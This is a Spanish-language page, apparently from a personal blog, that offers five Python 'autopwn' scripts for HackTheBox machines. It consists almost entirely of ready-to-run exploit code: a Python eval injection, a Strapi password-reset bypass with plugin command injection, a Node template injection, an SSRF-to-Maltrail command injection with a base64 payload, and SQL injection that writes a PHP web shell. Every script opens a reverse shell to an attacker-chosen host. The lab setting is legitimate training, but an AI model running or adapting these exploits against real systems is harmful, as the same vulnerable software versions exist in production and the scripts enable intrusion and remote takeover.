---
title: AutoPwns para HackTheBox
layout: page
permalink: /Script_autopwns
---
<h2 class="amarillo">Autopwns en HackTheBox</h2>

Herramientas para automatizar la intrusión en HTB hasta www-data o lo que corresponda con Python.

<h2 id="green">Busqueda</h2>

<div style="text-align: center;">
  <img src="/assets/images/Scripts/autopwns/1.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd
import signal
import sys
from termcolor import colored
import requests
import argparse
import threading
from pwn import *


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Busqueda", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://searcher.htb)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def searchorExploit(URL, IP, PORT):
    reverse = """', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#""" % (
        IP, PORT)

    data = {'engine': 'Yandex',
            'query': reverse}

    r = requests.post(URL + "/search", data=data)


def main():
    URL, IP, PORT = get_arguments()

    try:
        threading.Thread(target=searchorExploit, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<h2 id="green">Horizontall</h2>

<div style="text-align: center;">
  <img src="/assets/images/Scripts/autopwns/2.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd

import sys
import signal
from termcolor import colored
import argparse
import requests
import re
import json
from pwn import *
import threading


# Variables Globales
thread = None


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...", "red"))
    stop_event.set()

    if thread and thread.is_alive():
        thread.join()

    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Horizontall", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine API URL to Pwn (i.e --url http://api-prod.horizontall.htb/)")
    parser.add_argument('-P', '--password', dest="PASSWORD",
                        help="Set new Password to administrator user (i.e -P paloloco)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.PASSWORD is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.PASSWORD, options.IP, options.PORT


def check_strapi_version(URL):
    p1 = log.progress(colored("Checking Strapi Version...", "red"))
    version = requests.get(URL+'/admin/init').text
    regex = r"""\"strapiVersion\":\"([^\"]+)\""""
    version = re.findall(regex, version)

    if version == ["3.0.0-beta.17.4"]:
        p1.status(colored("This is Vulnerable!!", "green"))
    else:
        print(colored("\n[!] Sorry...\n", "red"))
        sys.exit(1)


def exploitAPI(URL, PASSWORD):
    global jwt
    current_session = requests.session()
    data = {"code": {"$gt": 0},
            "password": PASSWORD,
            "passwordConfirmation": PASSWORD}

    print("\n")
    p2 = log.progress(colored("Setting new Password - %s" % PASSWORD, "blue"))

    output = current_session.post(
        "%s/admin/auth/reset-password" % URL, json=data).text
    p2.status(output)
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print(colored("[!] FAILDED Password reset...\n\n", "red"))
        sys.exit(1)
    else:
        print(colored(
            f"[+] Password reset was successfull\n[+] Your email is: {email}\n[+] New Credentials: {username}:{PASSWORD}\n[+] Your authenticated JSON Web Token: {jwt}\n\n", "green"))


def get_shell(URL, IP, PORT):
    while not stop_event.is_set():
        headers = {"Authorization": f"Bearer {jwt}"}
        payload = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f|bash""" % (
            IP, PORT)
        data = {"plugin": f"documentation && $({payload})",
                "port": "1337"}
        r = requests.post(f"{URL}/admin/plugins/install",
                          json=data, headers=headers)


def main():
    URL, PASSWORD, IP, PORT = get_arguments()
    if URL.endswith("/"):
        URL = URL[:-1]

    check_strapi_version(URL)
    exploitAPI(URL, PASSWORD)

    global stop_event, thread
    stop_event = threading.Event()

    try:
        thread = threading.Thread(target=get_shell, args=(URL, IP, PORT))
        thread.start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<h2 id="green">NunChucks</h2>

<div style="text-align: center;">
  <img src="/assets/images/Scripts/autopwns/3.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd

import sys
import signal
from termcolor import colored
import requests
from pwn import *
import argparse
import threading


# Ctrl_C
def def_handler(sig, frame):
    print(colored("[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description=colored(
        "AutoPwn NunChucks", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://store.nunchucks.htb)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def stti(URL, IP, PORT):
    main_url = URL+'/api/submit'
    data = {
        "email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f')\")()}}@gmail.com" % (IP, PORT)}
    r = requests.post(main_url, data=data, verify=False)


def main():
    URL, IP, PORT = get_arguments()

    try:
        threading.Thread(target=stti, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<h2 id="green">Sau</h2>

<div style="text-align: center;">
  <img src="/assets/images/Scripts/autopwns/4.jpg" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd
import sys
import signal
from termcolor import colored
import argparse
import random
import string
import threading
from pwn import *
import subprocess
import requests
import base64


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Sau", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://10.129.229.26)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


# Variables Globales
request_basket_port = 55555
api_url = "/api/baskets/"


def createBasket(URL):
    p1 = log.progress("Creating Basket")
    p1.status("Loading")

    global basket_name
    basket_name = ''.join(random.choices(string.ascii_lowercase, k=6))

    payload = {"forward_url": "http://localhost", "proxy_response": True,
               "insecure_tls": False, "expand_path": True, "capacity": 250}

    p1.status(payload)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = f"{URL}:{request_basket_port}{api_url}{basket_name}"

    try:
        r = requests.post(full_url, headers=headers, json=payload, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    if r.status_code == 201:
        p1.status("Succesfully uploaded payload!!")
        print(colored(f"[+] Basket created - {basket_name}", "green"))
    else:
        print(colored("\n\n[!] FATAL: Could not properly request %s. Is the server online?" %
              full_url, "red"))
        sys.exit(1)


def maltrailExploit(url, IP, PORT):
    target_url = url+'/login'
    p2 = log.progress(colored("Exploiting Maltrail 0.5.3", "red"))

    reverse = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'' % (
        IP, PORT)
    reverse_base64 = base64.b64encode(reverse.encode()).decode()
    command = f"curl '{target_url}' --data 'username=;`echo+\"{reverse_base64}\"+|+base64+-d+|+sh`'"
    os.system(command)


def main():
    URL, IP, PORT = get_arguments()
    createBasket(URL)

    basket_url = URL+':'+str(request_basket_port)+'/'+basket_name
    try:
        threading.Thread(target=maltrailExploit,
                         args=(basket_url, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<h2 id="green">Validation</h2>

<div style="text-align: center;">
  <img src="/assets/images/Scripts/autopwns/5.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Autor: Juan García aka liandd
import sys
import signal
from termcolor import colored
import requests
import argparse
import threading
from pwn import *


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Validation", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://10.129.95.235)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def upload_file(URL):
    data = {'username': 'blyat',
            'country': """Uruguay' union select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"-- -"""}

    r = requests.post(URL, data=data)


def intrusion(URL, IP, PORT):
    data = {
        'cmd': "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' " % (IP, PORT)}

    r = requests.get(URL + "/shell.php", params=data)


def main():
    URL, IP, PORT = get_arguments()
    upload_file(URL)

    try:
        threading.Thread(target=intrusion, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

